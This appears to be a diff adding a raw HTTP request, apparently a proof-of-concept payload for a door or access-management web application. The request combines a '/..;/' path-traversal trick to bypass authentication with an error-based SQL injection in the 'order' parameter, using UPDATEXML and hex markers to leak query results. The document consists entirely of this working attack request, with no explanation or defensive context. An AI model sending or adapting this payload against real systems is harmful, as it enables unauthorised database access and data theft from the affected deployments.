@@ -1,0 +1,3 @@
+GET /manage/dgmCommand/finishRegister.do/..;/..;/doorInfo/queryDoorInfoList.du?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+Host:
+
